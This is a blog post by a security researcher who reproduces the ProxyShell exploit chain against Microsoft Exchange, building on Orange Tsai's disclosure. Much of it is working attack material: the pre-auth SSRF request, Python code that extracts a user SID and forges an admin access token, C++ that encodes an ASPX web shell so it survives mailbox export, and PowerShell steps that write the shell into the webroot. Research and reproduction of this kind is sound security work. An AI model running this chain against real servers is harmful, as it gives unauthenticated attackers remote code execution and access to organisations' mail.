---
layout: post
title:  "My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai)"
date:   2021-08-16 16:00:00 +0700
categories: research
author: Quang Vo
description: Research analysis and develop a working exploit poc script 
---

## ProxyShell Microsoft Exchange 

Reference: 
- The original talk is from Orange Tsai: [https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf?fbclid=IwAR2V0-4k2yb8dmPP5Mksd8iHYTOfE6sBwygMt4wjq3M9be8Tw6TlH0andhA](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf?fbclid=IwAR2V0-4k2yb8dmPP5Mksd8iHYTOfE6sBwygMt4wjq3M9be8Tw6TlH0andhA)
- Amazing research write up from peterjson and Jang:[ https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1](https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1)
- Another amazing write up: [https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/](https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/)


### 1. Pre-auth SSRF

The endpoint `/autodiscover.json` is one of the endpoints that we can access without authentication

<img width="1413" alt="image" src="https://user-images.githubusercontent.com/37280106/129542517-f35ab234-4613-491c-844a-75e88fbf8da8.png">

If our URL end with `/autodiscover.json` , `ClientRequest` will fetch the param `Email` 

<img width="1262" alt="image" src="https://user-images.githubusercontent.com/37280106/129544327-4c4fe18e-eb19-4466-a616-aff25e3a4087.png">

`explicitLogonAddress` must contains valid email address

So if our `explicitLogonAddress=/autodiscover/autodiscover.json?a=a@test.com` then the `/autodiscover/autodiscover.json?a=a@test.com` part will be removed from the URI.

ex: 
```
http://exchange.local/autodiscover/autodiscover.json@test.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3F@test.com
```
Will become
```
http://exchange.local/mapi/nspi?&Email=autodiscover/autodiscover.json%3F@test.com
```

When preparing request to send to backend internal, Exchange will generate Kerberos auth header and attach into Authorization header. This is why we can reach some other endpoint without any authentication


The Fatal erase: 

```text
GET /autodiscover/autodiscover.json?@test.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/2
Host: exchange.local
Cookie: cookieTest=1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
```

```text
HTTP/2 200 OK
Cache-Control: private
Content-Type: text/html
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
Request-Id: 505bae40-9e29-4c22-9bb6-68686012d721
X-Calculatedbetarget: win-mkl80dild4h.exchange.local
X-Serverapplication: Exchange/15.01.2176.009
X-Diaginfo: WIN-MKL80DILD4H
X-Beserver: WIN-MKL80DILD4H
X-Aspnet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=; expires=Thu, 15-Aug-1991 03:08:59 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-Feserver: WIN-MKL80DILD4H
Date: Sun, 15 Aug 2021 03:08:58 GMT
Content-Length: 553

<html>
<head>
<title>Exchange MAPI/HTTP Connectivity Endpoint</title>
</head>
<body>
<p>Exchange MAPI/HTTP Connectivity Endpoint<br><br>Version: 15.1.2176.9<br>Vdir Path: /mapi/nspi/<br><br></p><p>
```

<img width="1146" alt="image" src="https://user-images.githubusercontent.com/37280106/129546779-695fca9d-dd4c-47d2-a498-5feb214f5df5.png">

We archieved the Pre-auth SSRF, direct access to Exchange Server back-end !!!


### 2. Exchange Powershell Remoting

The Exchange PowerShell Remoting is built upon PowerShell API and uses the Runspace for isolations. All operations are based on WinRM protocol

We need to look for the way to access `/powershell` endpoint, by accessing `/powershell` endpoint, we are one-step closer to the final goal - RCE

From Orange Tsai's talk, he said that because we access the endpoint with `NT\SYSTEM` priviledge, we will fail the business logic since `SYSTEM` does not have any mailbox.

We cannot forge the `X-CommonAccessToken` because it's in the blacklisted cookies/headers

<img width="1318" alt="image" src="https://user-images.githubusercontent.com/37280106/129550275-02ca7e41-d165-49da-8bf7-0ba303b5ab98.png">



A few modules we should pay attention to

```text
Microsoft.Exchange.Security
Microsoft.Exchange.PwshClient
Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule
BackendRehydrationModule
```


From the Orange Tsai's talk, we know that the `BackendRehydrationModule` play an important part in authentication process

<img width="1207" alt="image" src="https://user-images.githubusercontent.com/37280106/129551467-54e67b8e-3232-483b-9bcc-ddfe14de00eb.png">

>  Microsoft.Exchange.Security.Authentication.BackendRehydrationModule

<img width="1048" alt="image" src="https://user-images.githubusercontent.com/37280106/129550769-a21e228c-5ef9-4fd2-89c4-5152a4fe117c.png">

We cannot access `/powershell` endpoint because we don't have `X-CommonAccessToken` header, we cannot forge the `X-CommonAccessToken: <token>` to impersonate other user because `X-CommonAccessToken` is in the blacklisted headers. So what to do ?

Lucky for us, we have a module is called before the `BackendRehydrationModule` and it extract Access-Token fromURL



> Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule

<img width="1027" alt="image" src="https://user-images.githubusercontent.com/37280106/129552591-36cdf54c-ae20-462a-954a-f7d4e21d981c.png">


<img width="1033" alt="image" src="https://user-images.githubusercontent.com/37280106/129552443-e99e7e9b-7690-476f-8ca4-73d857621627.png">

The code's logic look for `X-CommonAccessToken` header, if the header is not exist, it will extract `X-RPS-CAT` param and deserialize it as a Access Token (`X-CommonAccessToken` )


> Microsoft.Exchange.Security.Authorization.CommonAccessToken ( serialization process)

<img width="1041" alt="image" src="https://user-images.githubusercontent.com/37280106/129540035-3ab2be12-3540-45dd-85a4-bdb7aeb89581.png">



> Microsoft.Exchange.Security.Authorization.CommonAccessToken (deserialization process)

<img width="1073" alt="image" src="https://user-images.githubusercontent.com/37280106/129540057-3b6def40-f842-4283-aca9-13c20ef48842.png">

The pseudo code for the token deserialization:

```text
V + this.Version + T + this.TokenType C + compress + data
if compress => decompress
if AccessTokenType is Windows => DeserializeFromToken
```

<img width="970" alt="image" src="https://user-images.githubusercontent.com/37280106/129553511-6abd50c8-3fc3-49a9-8c92-59b0311e7916.png">

<img width="1074" alt="image" src="https://user-images.githubusercontent.com/37280106/129553904-94303325-c9b9-485a-a082-dc6de45305f9.png">


Pseudo code for DeserializeFromToken
```
A + this.AuthenticationType + L + this.LogonName + U + UserSID + G + Group Length + GroupSids
```

Now, we can craft an admin privilege CommonAccessToken via “X-Rps-CAT” parameter since we know how the Token is constructed

We need a UserSID to craft our token

```python
def get_sid(url: str, email: str):

    print("[-] Getting LegacyDN")
    body = f"""
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{email}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>
    """

    autodiscover_url = url + f"/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.post(autodiscover_url, headers={
        "Content-Type": "text/xml"
    }, data=body.encode("utf-8"), verify=False)
    autodiscover_xml = ET.fromstring(resp.text)
    legacydn = autodiscover_xml.find('{*}Response/{*}User/{*}LegacyDN').text
    print("[+] Successfully get LegacyDN")
    data = legacydn
    data += '\x00\x00\x00\x00\x00\xe4\x04'
    data += '\x00\x00\x09\x04\x00\x00\x09'
    data += '\x04\x00\x00\x00\x00\x00\x00'

    headers = {
        "X-Requesttype": 'Connect',
        "X-Clientapplication": 'Outlook/15.1.2176.9',
        "X-Requestid": 'anything',
        'Content-Type': 'application/mapi-http'
    }
    print("[-] Getting User SID")
    sid_endpoint = url + f"/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.post(sid_endpoint, data=data,
                         headers=headers, verify=False)
    sid = resp.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
    print("[+] Successfully get User SID")
    return sid

```

I copy the `gen_token` function from [this amazing write up](https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/) to help me build the poc script/

```python
def gen_token(email: str, sid: str):
    # Credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    print("[-] Generating token")
    version = 0
    ttype = 'Windows'
    compressed = 0
    auth_type = 'Kerberos'
    raw_token = b''
    gsid = 'S-1-5-32-544'

    version_data = b'V' + (1).to_bytes(1, 'little') + \
        (version).to_bytes(1, 'little')
    type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
    compress_data = b'C' + (compressed).to_bytes(1, 'little')
    auth_data = b'A' + (len(auth_type)).to_bytes(1,
                                                 'little') + auth_type.encode()
    login_data = b'L' + (len(email)).to_bytes(1, 'little') + email.encode()
    user_data = b'U' + (len(sid)).to_bytes(1, 'little') + sid.encode()
    group_data = b'G' + struct.pack('<II', 1, 7) + \
        (len(gsid)).to_bytes(1, 'little') + gsid.encode()
    ext_data = b'E' + struct.pack('>I', 0)

    raw_token += version_data
    raw_token += type_data
    raw_token += compress_data
    raw_token += auth_data
    raw_token += login_data
    raw_token += user_data
    raw_token += group_data
    raw_token += ext_data

    data = base64.b64encode(raw_token).decode()

    print(f"[+] Token generated: {data}")
    return data

```

Use the token to request to `/powershell` endpoint, if the server return with 200 status code, that means the token is accepted

<img width="1086" alt="image" src="https://user-images.githubusercontent.com/37280106/129684825-739bcc15-0c50-4bf9-a0b6-d1716c272970.png">

So now, we can execute arbitrary Powershell code on the exchange server with Admin priviledge. But the Powershell Cmdlet module come with a very limited list of commands that we can execute. We want more than that !!!

### 3. Working with remote Powershell and archieved the post-auth RCE

Since we are now an admin of Exchange Server, there are many potential commands to abuse to get Post Auth RCE. I will use the `New-MailboxExportRequest` command

According to [Microsoft docs](https://docs.microsoft.com/en-us/powershell/module/exchange/new-mailboxexportrequest?view=exchange-ps),  `New-MailboxExportRequest` allow us to export user's mailbox to a file. That allow us to write arbitrary file to any location, we can write our shell to web root location of Exchange server.


This is where the arbitrary write file happens, the API doesn't check that the exported files have to be a certain format extension, like `.pst,...`, so we can use that and export our payload to any file extension, like `abc.aspx` for example 

ex:
```powershell
New-MailboxExportRequest -Mailbox AylaKol -FilePath "\\SERVER01\PSTFileShare\Ayla_Recovered.pst"
```

The exported file is encoded and in `PST` format. Now come the fun part, how do we write the data to mailbox so that after the mail is exported into a PST file, it still a useable shell for us ?. 

Follow Orange Tsai's talk, he showed us how to encode the payload first and then send it to the Exchange Server, when the Exchange server try to save and export the file and encode it again, it will turns it into the orginal malicious code . This [MS-doc](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd) will help us how to encode our shell before sending.

At the time I was writing this research, I haven't found any way to implement this in python, so I copied the C++ code from Microsoft Blog and modify it a little bit

```c
#include <stdio.h> 
#include <windows.h>
#include <string.h>
#include "base64.h"

BYTE mpbbCrypt[] =
{
     65,  54,  19,  98, 168,  33, 110, 187,
    244,  22, 204,   4, 127, 100, 232,  93,
     30, 242, 203,  42, 116, 197,  94,  53,
    210, 149,  71, 158, 150,  45, 154, 136,
     76, 125, 132,  63, 219, 172,  49, 182,
     72,  95, 246, 196, 216,  57, 139, 231,
     35,  59,  56, 142, 200, 193, 223,  37,
    177,  32, 165,  70,  96,  78, 156, 251,
    170, 211,  86,  81,  69, 124,  85,   0,
      7, 201,  43, 157, 133, 155,   9, 160,
    143, 173, 179,  15,  99, 171, 137,  75,
    215, 167,  21,  90, 113, 102,  66, 191,
     38,  74, 107, 152, 250, 234, 119,  83,
    178, 112,   5,  44, 253,  89,  58, 134,
    126, 206,   6, 235, 130, 120,  87, 199,
    141,  67, 175, 180,  28, 212,  91, 205,
    226, 233,  39,  79, 195,   8, 114, 128,
    207, 176, 239, 245,  40, 109, 190,  48,
     77,  52, 146, 213,  14,  60,  34,  50,
    229, 228, 249, 159, 194, 209,  10, 129,
     18, 225, 238, 145, 131, 118, 227, 151,
    230,  97, 138,  23, 121, 164, 183, 220,
    144, 122,  92, 140,   2, 166, 202, 105,
    222,  80,  26,  17, 147, 185,  82, 135,
     88, 252, 237,  29,  55,  73,  27, 106,
    224,  41,  51, 153, 189, 108, 217, 148,
    243,  64,  84, 111, 240, 198, 115, 184,
    214,  62, 101,  24,  68,  31, 221, 103,
     16, 241,  12,  25, 236, 174,   3, 161,
     20, 123, 169,  11, 255, 248, 163, 192,
    162,   1, 247,  46, 188,  36, 104, 117,
     13, 254, 186,  47, 181, 208, 218,  61,
     20,  83,  15,  86, 179, 200, 122, 156,
    235, 101,  72,  23,  22,  21, 159,   2,
    204,  84, 124, 131,   0,  13,  12,  11,
    162,  98, 168, 118, 219, 217, 237, 199,
    197, 164, 220, 172, 133, 116, 214, 208,
    167, 155, 174, 154, 150, 113, 102, 195,
     99, 153, 184, 221, 115, 146, 142, 132,
    125, 165,  94, 209,  93, 147, 177,  87,
     81,  80, 128, 137,  82, 148,  79,  78,
     10, 107, 188, 141, 127, 110,  71,  70,
     65,  64,  68,   1,  17, 203,   3,  63,
    247, 244, 225, 169, 143,  60,  58, 249,
    251, 240,  25,  48, 130,   9,  46, 201,
    157, 160, 134,  73, 238, 111,  77, 109,
    196,  45, 129,  52,  37, 135,  27, 136,
    170, 252,   6, 161,  18,  56, 253,  76,
     66, 114, 100,  19,  55,  36, 106, 117,
    119,  67, 255, 230, 180,  75,  54,  92,
    228, 216,  53,  61,  69, 185,  44, 236,
    183,  49,  43,  41,   7, 104, 163,  14,
    105, 123,  24, 158,  33,  57, 190,  40,
     26,  91, 120, 245,  35, 202,  42, 176,
    175,  62, 254,   4, 140, 231, 229, 152,
     50, 149, 211, 246,  74, 232, 166, 234,
    233, 243, 213,  47, 112,  32, 242,  31,
      5, 103, 173,  85,  16, 206, 205, 227,
     39,  59, 218, 186, 215, 194,  38, 212,
    145,  29, 210,  28,  34,  51, 248, 250,
    241,  90, 239, 207, 144, 182, 139, 181,
    189, 192, 191,   8, 151,  30, 108, 226,
     97, 224, 198, 193,  89, 171, 187,  88,
    222,  95, 223,  96, 121, 126, 178, 138,
     71, 241, 180, 230,  11, 106, 114,  72,
    133,  78, 158, 235, 226, 248, 148,  83,
    224, 187, 160,   2, 232,  90,   9, 171,
    219, 227, 186, 198, 124, 195,  16, 221,
     57,   5, 150,  48, 245,  55,  96, 130,
    140, 201,  19,  74, 107,  29, 243, 251,
    143,  38, 151, 202, 145,  23,   1, 196,
     50,  45, 110,  49, 149, 255, 217,  35,
    209,   0,  94, 121, 220,  68,  59,  26,
     40, 197,  97,  87,  32, 144,  61, 131,
    185,  67, 190, 103, 210,  70,  66, 118,
    192, 109,  91, 126, 178,  15,  22,  41,
     60, 169,   3,  84,  13, 218,  93, 223,
    246, 183, 199,  98, 205, 141,   6, 211,
    105,  92, 134, 214,  20, 247, 165, 102,
    117, 172, 177, 233,  69,  33, 112,  12,
    135, 159, 116, 164,  34,  76, 111, 191,
     31,  86, 170,  46, 179, 120,  51,  80,
    176, 163, 146, 188, 207,  25,  28, 167,
     99, 203,  30,  77,  62,  75,  27, 155,
     79, 231, 240, 238, 173,  58, 181,  89,
      4, 234,  64,  85,  37,  81, 229, 122,
    137,  56, 104,  82, 123, 252,  39, 174,
    215, 189, 250,   7, 244, 204, 142,  95,
    239,  53, 156, 132,  43,  21, 213, 119,
     52,  73, 182,  18,  10, 127, 113, 136,
    253, 157,  24,  65, 125, 147, 216,  88,
     44, 206, 254,  36, 175, 222, 184,  54,
    200, 161, 128, 166, 153, 152, 168,  47,
     14, 129, 101, 115, 228, 194, 162, 138,
    212, 225,  17, 208,   8, 139,  42, 242,
    237, 154, 100,  63, 193, 108, 249, 236
};

#define mpbbR   (mpbbCrypt)
#define mpbbS   (mpbbCrypt + 256)
#define mpbbI   (mpbbCrypt + 512)

void CryptPermute(PVOID pv, int cb, BOOL fEncrypt)
{
    // cb -> buffer size
    // pv -> buffer
    byte* pb = (byte*)pv;
    byte* pbTable = fEncrypt ? mpbbR : mpbbI;
    const DWORD* pdw = (const DWORD*)pv;
    DWORD         dwCurr;
    byte         b;


    if (cb >= sizeof(DWORD))
    {
        while (0 != (((DWORD_PTR)pb) % sizeof(DWORD)))
        {
            *pb = pbTable[*pb];
            pb++;
            cb--;
        }

        pdw = (const DWORD*)pb;
        for (; cb >= 4; cb -= 4)
        {
            dwCurr = *pdw;

            b = (byte)(dwCurr & 0xFF);
            *pb = pbTable[b];
            pb++;

            dwCurr = dwCurr >> 8;
            b = (byte)(dwCurr & 0xFF);
            *pb = pbTable[b];
            pb++;

            dwCurr = dwCurr >> 8;
            b = (byte)(dwCurr & 0xFF);
            *pb = pbTable[b];
            pb++;

            dwCurr = dwCurr >> 8;
            b = (byte)(dwCurr & 0xFF);
            *pb = pbTable[b];
            pb++;

            pdw++;
        }

        pb = (byte*)pdw;
    }

    for (; --cb >= 0; ++pb)
        *pb = pbTable[*pb];
}


void main() {
    char payload[] = "<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>";
    int length = strlen(payload);
    CryptPermute(payload, length, false);
    printf(payload);
    printf("\r\n\r\n");
    printf(base64_encode((unsigned char*)payload, length).c_str());
}

```

Got encodeded data in base64 

<img width="852" alt="image" src="https://user-images.githubusercontent.com/37280106/130055140-a525182a-6261-4638-ad25-b5f27ab9b170.png">


Now we know how to encode our payload, how do we send mail to the Admin's mailbox ?

The original talk from Orange Tsai, he delivered the payload through SMTP, but I like the Jang and PeterJson's way more. That is [EWS Impersonation](https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange)

By sending request to `/EWS/exchange.asmx` . We can create an email and save it in `Drafts` for any user via SOAP header `SerializedSecurityContext`


<img width="842" alt="image" src="https://user-images.githubusercontent.com/37280106/130030757-cc6ac13e-a8d4-4d75-993d-e44ebde5f26b.png">


<img width="1023" alt="image" src="https://user-images.githubusercontent.com/37280106/129873103-5b60af6e-8244-4e6f-9daa-6f40e5565389.png">

That's for the Post-Auth RCE part, for communicating with Remote Powershell, I follow the other researchers's way. Use  [pypsrp](https://www.bloggingforlogging.com/2018/08/14/powershell-remoting-on-python/), implement the proxy and forward requests to communicate with wsman

### 4. Chaining everything together - the ProxyShell

Now we have everything we need, let's chain it together:
- Use the Pre-auth SSRF to generate the token
- Use the token to request to Remote Powershell server
- Send email contains the malicious payload to user
- Assign Mailbox Import/Export role to our current session

```powershell
New-ManagementRoleAssignment -Role "Mailbox Import Export" -User email@email
```

- Export malicious email to webroot
- Enjoy the shell.

### POC video

<iframe width="640" height="320" src="https://www.youtube.com/embed/Ma921_3wtN4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

### Conclusion

This is a very nice exploit chain. For me, it wasn't easy to reproduce this at all, I have to read and research a lot, that was the most fun part and I learnt a lot. Orange Tsai is an amazing researcher and I'm a big fan of his work.

I still haven't understood the whole exploit chain, especially the Permuative Encoding part, so if anyone knows, please contact me via Twitter and explain it to me. I will appreciate it a lot ;) 
